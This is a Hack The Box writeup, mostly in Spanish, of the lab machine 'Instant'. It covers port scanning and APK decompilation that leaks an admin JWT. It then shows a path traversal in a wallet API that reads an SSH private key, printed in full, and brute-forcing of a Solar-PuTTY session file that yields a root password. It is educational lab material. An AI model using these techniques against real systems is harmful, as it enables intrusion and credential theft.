+++
author = "Andrés Del Cerro"
title = "Hack The Box: Instant Writeup | Medium"
date = "2025-03-19"
description = ""
tags = [
    "HackTheBox",
    "Instant",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "HTTP Enumeration",
    "APK Static Analysis",
    "API Enumeration",
    "Information Disclosure",
    "Directory Path Traversal",
    "Decrypting Solar-PuTTY session",
    "Scripting"
]

+++

# Hack The Box: Instant Writeup

Welcome to my detailed writeup of the medium difficulty machine **"Instant"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
$ rustscan -a 10.129.252.212 --ulimit 5000 -g
10.129.252.212 -> [22,80]
```

```console
$ nmap -p22,80 -sCV 10.129.252.212 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 19:44 CEST
Nmap scan report for 10.129.252.212
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://instant.htb/
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds
```

# UDP Enumeration

```console
$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.252.212 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 19:45 CEST
Nmap scan report for 10.129.252.212
Host is up (0.055s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
1060/udp  closed polestar
22124/udp closed unknown
22324/udp closed unknown
24528/udp closed unknown
28071/udp closed unknown
64481/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds
```

Del escaneo inicial encontramos el dominio `instant.htb`, lo añadimos al `/etc/hosts`

Como no hay muchos puertos abiertos, vamos a empezar enumerando el servicio HTTP que es el único punto de entrada posible en este caso.

# HTTP Enumeration

`whatweb` no nos reporta nada interesante a parte de un email, `support@instant.htb`
```console
$ whatweb http://10.129.252.212
http://10.129.252.212 [301 Moved Permanently] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.252.212], RedirectLocation[http://instant.htb/], Title[301 Moved Permanently]
http://instant.htb/ [200 OK] Apache[2.4.58], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[support@instant.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.252.212], JQuery[3.2.1], Script, Title[Instant Wallet]
```

El aspecto de la página se ve muy estático.
![Write-up Image](images/Screenshot_1.png)

Fuzzeando recursos no encuentro nada interesante.

Lo único interesante es el link de descarga `http://instant.htb/downloads/instant.apk` el cual nos descarga una aplicación APK.

Nos vamos a descargar la aplicación.
```console
$ wget http://instant.htb/downloads/instant.apk
--2024-10-14 19:52:51--  http://instant.htb/downloads/instant.apk
Resolving instant.htb (instant.htb)... 10.129.252.212
Connecting to instant.htb (instant.htb)|10.129.252.212|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5415990 (5,2M) [application/vnd.android.package-archive]
Saving to: ‘instant.apk’

instant.apk            100%[==========================>]   5,17M  8,29MB/s    in 0,6s    

2024-10-14 19:52:52 (8,29 MB/s) - ‘instant.apk’ saved [5415990/5415990]
```

Según los magic numbers es una aplicación para android.
```console
$ file instant.apk 
instant.apk: Android package (APK), with gradle app-metadata.properties, with APK Signing Block
```

# Static Analysis
Vamos a descargar `jd-gui`, un decompilador Java con interfaz gráfica que nos ayuda a investigar el código de las aplicaciones APK.
Lo podemos instalar con `apt`
```console
$ sudo apt-get install jd-gui
```

Vamos a crear una copia de la aplicación pero con la extensión .jar
```console
$ cp instant.apk instant.jar
```

Esto es porque `jd-gui` tiene un filtro de extensión de archivos y .apk no está incluido, pero realmente esto es un paquete gradle normal.

En el `app-metadata.properties` no encontramos nada.
![Write-up Image](images/Screenshot_2.png)

Veo un archivo `.gz` interesante.
![Write-up Image](images/Screenshot_3.png)

Vamos a instalar `apktool` con:
```console
$ sudo apt-get install apktool -y
```

Esta es otra herramienta para extraer los recursos android. En algunas aplicaciones android es normal que se guarden archivos de configuración, URL de firebase u otras cosas.

```console
$ apktool d instant.apk -o instant
I: Using Apktool 2.7.0-dirty on instant.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/pointedsec/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
```

Ahora en el directorio `instant` tenemos varios archivos, con un pequeño bucle for podemos buscar por URL's y encontramos un subdominio `mywalletv1.instant.htb`
```console
 for file in $(find -type f); do cat $file | grep "http://" | grep -v "http://schemas"; done
    const-string v5, "http://"
    const-string v2, "http://mywalletv1.instant.htb/api/v1/view/profile"
    const-string v7, "http://mywalletv1.instant.htb/api/v1/view/profile"
    const-string v1, "http://mywalletv1.instant.htb/api/v1/login"
    const-string p4, "http://mywalletv1.instant.htb/api/v1/register"
    const-string v0, "http://mywalletv1.instant.htb/api/v1/initiate/transaction"
    const-string v1, "http://mywalletv1.instant.htb/api/v1/confirm/pin"
```

Lo añadimos al `/etc/hosts` y esto parece que es una API.

Antes de nada vamos a seguir enumerando la aplicación.

Encontramos otro subdominio `swagger-ui`
```console
$ for file in $(find -type f); do cat $file | grep "instant.htb"; done
        <TextView android:textSize="14.0sp" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_margin="25.0dip" android:text="Please contact support@instant.htb to have your account recovered" android:fontFamily="sans-serif-condensed" android:textAlignment="center" />
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
```

Y aquí tenemos la documentación de la API.
![Write-up Image](images/Screenshot_4.png)

Podemos probar a registrarnos como usuario.
![Write-up Image](images/Screenshot_5.png)

Ahora podemos iniciar sesión.
![Write-up Image](images/Screenshot_6.png)

Se nos devuelve un token JWT.
![Write-up Image](images/Screenshot_7.png)

No vemos nada interesante en el payload del JWT.
![Write-up Image](images/Screenshot_8.png)

Sin embargo hay rutas interesantes pero que solo puede acceder un administrador.
![Write-up Image](images/Screenshot_9.png)

Entonces necesito encontrar una manera de crear una cuenta de administrador.

Volviendo otra vez a la APK, podemos grepear por la cabecera `Authorization` y vemos varias coincidencias.
```console
$ for file in $(find -type f); do cat $file | grep -i "Authorization"; done
    value = Lcom/instantlabs/instant/AdminActivities;->TestAdminAuthorization()Ljava/lang/String;
.method private TestAdminAuthorization()Ljava/lang/String;
    const-string v2, "Authorization"
    const-string v7, "Authorization"
    const-string v0, "Authorization"
    const-string v1, "Authorization"
    const-string v1, "Proxy-Authorization"
    const-string v1, "Authorization"
    const-string v0, "Proxy-Authorization"
    const-string p1, "Authorization"
    const-string v3, "authorization"
    const-string v3, "proxy-authorization"
```

Ahora vamos a hacer lo mismo pero con el parámetro `-C` de grep para ver 10 líneas por arriba y por abajo.

```console
$ for file in $(find -type f); do cat $file | grep -i "Authorization" -C 10 ; done
```

Y encontramos un token JWT.
![Write-up Image](images/Screenshot_10.png)

Comprobando esta cuenta de usuario vemos que tiene el rol de `Admin`
![Write-up Image](images/Screenshot_11.png)

# Enumerating API
Vemos dos usuarios interesantes, uno es el de la cuenta usuario actual y otro es `shirohige`
![Write-up Image](images/Screenshot_12.png)

Otra función que me llama la atención es la siguiente.
![Write-up Image](images/Screenshot_13.png)

Podemos listar los logs y vemos lo siguiente, el path de usuario, un directorio `logs` y lo que parece ser el contenido de dentro. `1.log` es el único log disponible.
![Write-up Image](images/Screenshot_14.png)

Vemos que podemos leer ese log y que es un log de prueba.
![Write-up Image](images/Screenshot_15.png)

# Directory Path Traversal -> Foothold
Si intentamos leer el log utilizando la ruta absoluta no se puede, esto es porque internamente al buscar la ruta, utiliza como referencia la ruta `/home/shirohige/logs/`, por lo cual, si intentamos utilizar la ruta absoluta realmente estaríamos intentando buscar el archivo `/home/shirohige/logs//home/shirohige/logs/1.log` y claramente no existe.
![Write-up Image](images/Screenshot_16.png)

El input del usuario no se sanitiza por detrás, por lo cual podemos hacer un `Directory Path Traversal` y leer archivos que no deberíamos de leer.
![Write-up Image](images/Screenshot_17.png)


Podemos leer la flag de usuario, pero todavía no hemos ganado acceso a la máquina víctima.
![Write-up Image](images/Screenshot_18.png)

Podemos leer la clave privada de este usuario.
![Write-up Image](images/Screenshot_19.png)

Podemos copiar esta clave privada y tratarla para que tenga un formato válido.
```console
$ cat id_rsa.shirohige 
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAt9H//G6UrF2M7/Qtmpwtol/3SnWFMn9umO2psYcvw5yBou1A
ErkP/NaSpSi+4/OKBBjrksX+4FubcWsOvMroUmtNaXjpH9DqZrIDus5g1SU4nGeA
MZdmdsjAg42oEPD4MSJ4jnVfs8R8KE6GFHEHG4WkLAWn4n+M6nKrnXNsFWG2mAIX
idWo1YBtW5QEOxE6choUHD8LZYoHroZrRarrhQAhrbobRBN4txb/Z2LTB1/wL9xC
KDZBOKtnzXFUbyviV1XO+DiA8XDwDnubDWEBOPDkQ+hDXNUGnszZfsJxAS0IV208
DojG/b0cBVUYPVfVYWhbENH9tyie+4833m5AeQIDAQABAoIBAA5BLzWJ9RE0GftQ
91O028cVOQ3hn314gKuZoTNT9UIZOhECjpmabKEh70ehKW3E6NrY0d/VEdGf2Ps1
HvSd/uEb/Wn58d4Wldl2jC/UKZHYgT4uZTRd9hitCFzLQzwOa7i9CxXvsocJbCAL
YtNlUR9IavWXpLAS+GsFOcYLztcOK0ejXgej8uuXv1bqK8MwnIS4P5RAlrzU/ze5
z7DqYHEmkmDzB4MisOMtKcaMnYWJ7UnNRbi9x/eLI0Ng4dX4gweou2z6Mvfl2Gbl
GzCrN+dlR7NexloNnMt3wvpzQV5po9bdu4hji+spBJwJZ9WF54IqoKUYyeo1QoXF
N0S3nA8CgYEA3p/DKumvOtrae/J3HJkQ1BRmg2kPF+k1rzOpE7V7CD9EAWSSbEpr
iv6U5ELrdnUNVrsu7VCSInxC+gwKh4myS1n/Qwxo/uOBZMQ5X5z4M5d22cc3Siv/
uEGNfd4ddW7eBv7AA4nnUPRnYXO75By196GM9QGCqMiiYFJUn/BB0dsCgYEA02D2
VFmYtE4U0vX4SsW4yQdMtPfJKsgT1UY3Pmypr8PzPYAmOYHedrkaDD8rRVNPQiYx
sQ5wAgY00uB7d6YY+/gJKYRQh+Jj0lhDBF5QRtZd3qFnzhKJQHDQcwxe1xGBpE8A
Zhcmrhtr9FwV6joEKn8QKAG4m+55PtpFYSu1mTsCgYEAwRkYQweQy177NZlZAYAu
3ZWYWZFt2xKYUxBfLk4ymjOt+/tNGgru/w/U+6yj6gqbeEhB6uwA5VKdEaASHgAs
mzlDtNd11uhk2o9tKGbRzoYpO7qVVYuWci7B2JQpPyvb/3tF94vNDSYA6cFmDvVs
TI9e4UDfISFt3lhrOJM/tBMCgYEAtLf+gmlDrEvhc+fFyy+2Z3DtPP9oJ0J96mao
zp8aiGJwcNFCXQJSj5B726KaPSAX8Ec1Tto4GxLxUKWKCeahD7OlKbCtJTACBhFd
4rs7yQR3puK6HC4u2EBbhzE5WIjoHPFKNv5uHIbnSjj8p4/IhgiyaHHoQrClSn5U
uNok3YcCgYEAlZm8q+7OLAbfBsWLZ4m3I9AaPTdIvpPiKBsXesf+BzHR9faswGdb
f3rKKjk4yuEkA336dZ3KEKRotCulBj33t645z0z1qY3eNczPUap979veWvgjZCCt
hEitCPPh4xFo+NAkXQU7G7WnR9qtGm1NMaqXAptdURjCw8Idp5TeqYY=
-----END RSA PRIVATE KEY-----
```

Le damos los permisos adecuados.
```console
$ chmod 600 id_rsa.shirohige 
```

Y ahora por SSH podemos ganar acceso como este usuario en la máquina víctima.
```console
$ ssh -i id_rsa.shirohige shirohige@instant.htb
The authenticity of host 'instant.htb (10.129.252.212)' can't be established.
ED25519 key fingerprint is SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'instant.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$ id
uid=1001(shirohige) gid=1002(shirohige) groups=1002(shirohige),1001(development)
```

# Privilege Escalation
No vemos otro usuario interesante a parte de `shirohige` y `root`
```console
shirohige@instant:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash
```

Para hacer `sudo -l` necesito credencial, y no la tengo.
```console
shirohige@instant:~$ sudo -l
[sudo] password for shirohige: 
```

Analizando el directorio `projects` del usuario, encontramos un archivo `.env` que contiene una clave secreta.
```console
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet$ cat .env 
SECRET_KEY=VeryStrongS3cretKeyY0uC4NTGET
```

Esta clave no es válida para este usuario, pero bueno, para algo servirá.
```console
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet$ sudo -l
[sudo] password for shirohige: 
Sorry, try again.
[sudo] password for shirohige: 
sudo: 1 incorrect password attempt
```

Vemos un archivo `instant.db`
```console
hirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ ls -la
total 44
drwxr-xr-x 2 shirohige shirohige  4096 Oct 14 16:13 .
drwxr-xr-x 5 shirohige shirohige  4096 Oct  4 15:22 ..
-rw-r--r-- 1 shirohige shirohige 36864 Oct 14 16:13 instant.db
```

Es una BBDD SQLite 3.
```console
$ file instant.db
instant.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 14, database pages 9, cookie 0x3, schema 4, UTF-8, version-valid-for 14
```

Vemos el hash de la contraseña de este usuario.
```console
sqlite> select * from wallet_users;
1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active
2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active
3|pointed|pointed@pointed.com|d84ca133-369f-45bc-a652-715aab65dafc|pbkdf2:sha256:600000$rbc6iaE2jCdv3DPG$7aaad442b2631a0685d69ec03069d0d657890620d4a1796576c58f9f7e071f98|2024-10-14 16:13:18.638390|12345|instantian|active
```

Después de probar no pude crackear este hash, así que será un rabbit-hole.

# Decrypting `Solar-PuTTY session file`
Filtrando por archivos cuyo propietario sea nuestro usuario actual encontramos un archivo interesante.

```console
shirohige@instant:/$ find -type f -user shirohige 2>/dev/null | grep -v "sys"  | grep -v "proc"
```

![Write-up Image](images/Screenshot_20.png)

Podemos intuir que es un archivo exportado de una sesión de `Solar-PuTTY`, es un cliente SSH, Telnet... Como `PuTTY` pero mas "moderno".

Buscando por internet me encontré un PoC para Windows pero también me encontré un artículo muy interesante.
https://hackmd.io/@tahaafarooq/cracking-solar-putty

Recomiendo echarle un vistazo, explica como se gestionan las sesiones y la forma tan ridícula que tiene para "encriptar" estas sesiones.

Desgraciadamente necesitamos Windows para poder desencriptar esta sesión ya que utiliza los métodos `ProtectedData.Unprotect` y esto depende del mecanismo DPAPI de Windows.

Así que vamos a utilizar el [PoC de voidsec](https://github.com/VoidSec/SolarPuttyDecrypt)

Vamos a clonarnos el repositorio.

```console
C:\Users\pc\Desktop\instant>git clone https://github.com/VoidSec/SolarPuttyDecrypt
Cloning into 'SolarPuttyDecrypt'...
remote: Enumerating objects: 32, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 28 (from 1)
Receiving objects: 100% (32/32), 79.79 KiB | 1.66 MiB/s, done.
Resolving deltas: 100% (6/6), done.
```

Y lo vamos a abrir en `Visual Studio`
![Write-up Image](images/Screenshot_21.png)

Lo malo es que necesitamos una contraseña para desencriptar la sesión, y por defecto con este programa habría que probarla de una en una.

En resumen lo que hace es lo siguiente.
### **Desencriptación**

- **Método `Decrypt`**:
    
    - Desencripta el archivo de sesión usando **TripleDES** con la contraseña proporcionada. Utiliza el esquema de derivación de clave **Rfc2898DeriveBytes** (que implementa PBKDF2) para generar una clave de 24 bytes a partir de la contraseña y la "sal" extraída del archivo encriptado.
    - Los datos se desencriptan en bloques, usando modo de operación **CBC** y un vector de inicialización (**IV**) específico.
- **Método `Deob`**:
    
    - Si no se proporciona una contraseña, usa **ProtectedData.Unprotect** para desencriptar el archivo usando **DPAPI** (exclusivo de Windows). Esto indica que el archivo de sesión está cifrado utilizando la identidad del usuario local.

### 4. **Procesamiento del Archivo Desencriptado**

- El archivo desencriptado, que está en formato JSON, es leído y formateado para una mejor legibilidad usando la biblioteca **Newtonsoft.Json**.
- Luego, el archivo es guardado en el escritorio del usuario con el nombre `SolarPutty_sessions_decrypted.txt`.

He modificado el PoC y he creado una versión (fork) para admitir la fuerza bruta.
[Aquí tenéis el PoC modificado](https://github.com/pointedsec/SolarPuttyDecrypt-BruteForce)

Simplemente podemos descargarlo, compilarlo y utilizarlo.
```console
C:\Users\pc\Desktop\instant\SolarPuttyDecrypt\SolarPuttyDecrypt\bin\Release>.\SolarPuttyDecrypt.exe C:\Users\pc\Desktop\instant\SolarPuttyDecrypt\SolarPuttyDecrypt\bin\Release\sessions-backup.dat C:\Users\pc\Desktop\instant\SolarPuttyDecrypt\SolarPuttyDecrypt\bin\Release\rockyou.txt
-----------------------------------------------------
SolarPutty's Sessions Decrypter by VoidSec (Brute-Force by pointedsec)
-----------------------------------------------------
Trying password: 123456
Error de desencriptación: Datos incorrectos.
Trying password: 12345
Error de desencriptación: Datos incorrectos.
Trying password: 123456789
Error de desencriptación: Datos incorrectos.
Trying password: password
Error de desencriptación: Datos incorrectos.
Trying password: iloveyou
Error de desencriptación: Datos incorrectos.
Trying password: princess
Error de desencriptación: Datos incorrectos.
Trying password: 1234567
Error de desencriptación: Datos incorrectos.
Trying password: rockyou
Error de desencriptación: Datos incorrectos.
Trying password: 12345678
Error de desencriptación: Datos incorrectos.
Trying password: abc123
Error de desencriptación: Datos incorrectos.
Trying password: nicole
Error de desencriptación: Datos incorrectos.
Trying password: daniel
Error de desencriptación: Datos incorrectos.
Trying password: babygirl
Error de desencriptación: Datos incorrectos.
Trying password: monkey
Error de desencriptación: Datos incorrectos.
Trying password: lovely
Error de desencriptación: Datos incorrectos.
Trying password: jessica
Error de desencriptación: Datos incorrectos.
Trying password: 654321
Error de desencriptación: Datos incorrectos.
Trying password: michael
Error de desencriptación: Datos incorrectos.
Trying password: ashley
Error de desencriptación: Datos incorrectos.
Trying password: qwerty
Error de desencriptación: Datos incorrectos.
Trying password: 111111
Error de desencriptación: Datos incorrectos.
Trying password: iloveu
Error de desencriptación: Datos incorrectos.
Trying password: 000000
Error de desencriptación: Datos incorrectos.
Trying password: michelle
Error de desencriptación: Datos incorrectos.
Trying password: tigger
Error de desencriptación: Datos incorrectos.
Trying password: sunshine
Error de desencriptación: Datos incorrectos.
Trying password: chocolate
Error de desencriptación: Datos incorrectos.
Trying password: password1
Error de desencriptación: Datos incorrectos.
Trying password: soccer
Error de desencriptación: Datos incorrectos.
Trying password: anthony
Error de desencriptación: Datos incorrectos.
Trying password: friends
Error de desencriptación: Datos incorrectos.
Trying password: butterfly
Error de desencriptación: Datos incorrectos.
Trying password: purple
Error de desencriptación: Datos incorrectos.
Trying password: angel
Error de desencriptación: Datos incorrectos.
Trying password: jordan
Error de desencriptación: Datos incorrectos.
Trying password: liverpool
Error de desencriptación: Datos incorrectos.
Trying password: justin
Error de desencriptación: Datos incorrectos.
Trying password: loveme
Error de desencriptación: Datos incorrectos.
Trying password: fuckyou
Error de desencriptación: Datos incorrectos.
Trying password: 123123
Error de desencriptación: Datos incorrectos.
Trying password: football
Error de desencriptación: Datos incorrectos.
Trying password: secret
Error de desencriptación: Datos incorrectos.
Trying password: andrea
Error de desencriptación: Datos incorrectos.
Trying password: carlos
Error de desencriptación: Datos incorrectos.
Trying password: jennifer
Error de desencriptación: Datos incorrectos.
Trying password: joshua
Error de desencriptación: Datos incorrectos.
Trying password: bubbles
Error de desencriptación: Datos incorrectos.
Trying password: 1234567890
Error de desencriptación: Datos incorrectos.
Trying password: superman
Error de desencriptación: Datos incorrectos.
Trying password: hannah
Error de desencriptación: Datos incorrectos.
Trying password: amanda
Error de desencriptación: Datos incorrectos.
Trying password: loveyou
Error de desencriptación: Datos incorrectos.
Trying password: pretty
Error de desencriptación: Datos incorrectos.
Trying password: basketball
Error de desencriptación: Datos incorrectos.
Trying password: andrew
Error de desencriptación: Datos incorrectos.
Trying password: angels
Error de desencriptación: Datos incorrectos.
Trying password: tweety
Error de desencriptación: Datos incorrectos o formato no válido.
Trying password: flower
Error de desencriptación: Datos incorrectos.
Trying password: playboy
Error de desencriptación: Datos incorrectos.
Trying password: hello
Error de desencriptación: Datos incorrectos.
Trying password: elizabeth
Error de desencriptación: Datos incorrectos.
Trying password: hottie
Error de desencriptación: Datos incorrectos.
Trying password: tinkerbell
Error de desencriptación: Datos incorrectos.
Trying password: charlie
Error de desencriptación: Datos incorrectos.
Trying password: samantha
Error de desencriptación: Datos incorrectos.
Trying password: barbie
Error de desencriptación: Datos incorrectos.
Trying password: chelsea
Error de desencriptación: Datos incorrectos.
Trying password: lovers
Error de desencriptación: Datos incorrectos.
Trying password: teamo
Error de desencriptación: Datos incorrectos.
Trying password: jasmine
Error de desencriptación: Datos incorrectos.
Trying password: brandon
Error de desencriptación: Datos incorrectos.
Trying password: 666666
Error de desencriptación: Datos incorrectos.
Trying password: shadow
Error de desencriptación: Datos incorrectos.
Trying password: melissa
Error de desencriptación: Datos incorrectos.
Trying password: eminem
Error de desencriptación: Datos incorrectos.
Trying password: matthew
Error de desencriptación: Datos incorrectos.
Trying password: robert
Error de desencriptación: Datos incorrectos.
Trying password: danielle
Error de desencriptación: Datos incorrectos.
Trying password: forever
Error de desencriptación: Datos incorrectos.
Trying password: family
Error de desencriptación: Datos incorrectos.
Trying password: jonathan
Error de desencriptación: Datos incorrectos.
Trying password: 987654321
Error de desencriptación: Datos incorrectos.
Trying password: computer
Error de desencriptación: Datos incorrectos.
Trying password: whatever
Error de desencriptación: Datos incorrectos.
Trying password: dragon
Error de desencriptación: Datos incorrectos.
Trying password: vanessa
Error de desencriptación: Datos incorrectos.
Trying password: cookie
Error de desencriptación: Datos incorrectos.
Trying password: naruto
Error de desencriptación: Datos incorrectos.
Trying password: summer
Error de desencriptación: Datos incorrectos.
Trying password: sweety
Error de desencriptación: Datos incorrectos.
Trying password: spongebob
Error de desencriptación: Datos incorrectos.
Trying password: joseph
Error de desencriptación: Datos incorrectos.
Trying password: junior
Error de desencriptación: Datos incorrectos.
Trying password: softball
Error de desencriptación: Datos incorrectos.
Trying password: taylor
Error de desencriptación: Datos incorrectos.
Trying password: yellow
Error de desencriptación: Datos incorrectos.
Trying password: daniela
Error de desencriptación: Datos incorrectos.
Trying password: lauren
Error de desencriptación: Datos incorrectos.
Trying password: mickey
Error de desencriptación: Datos incorrectos.
Trying password: princesa
Error de desencriptación: Datos incorrectos.
Trying password: alexandra
Error de desencriptación: Datos incorrectos.
Trying password: alexis
Error de desencriptación: Datos incorrectos.
Trying password: jesus
Error de desencriptación: Datos incorrectos.
Trying password: estrella
[+] Password found: estrella
-----------------------------------------------------
[+] DONE Decrypted file is saved in: C:\Users\pc\Desktop\SolarPutty_sessions_decrypted.txt
```

Vemos que la credencial era `estrella`.

Ahora podemos comprobar este archivo que en principio debe de ser un JSON válido.

Lo malo que el JSON está en una sola línea, vamos a utilizar [jsonformatter](https://jsonformatter.org/json-pretty-print) para copiar y pegar el JSON y lo vemos bien formateado.
![Write-up Image](images/Screenshot_22.png)

Y vemos esta parte en el JSON.
```json
"Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
```

Y ya podemos migrar al usuario `root`
```console
shirohige@instant:/opt/backups/Solar-PuTTY$ su root
Password: 
root@instant:/opt/backups/Solar-PuTTY# id
uid=0(root) gid=0(root) groups=0(root)
```

Podemos leer la flag de `root`
```console
root@instant:~# cat root.txt 
4e1c549df07e76...
```

¡Y ya estaría!

Happy Hacking! 🚀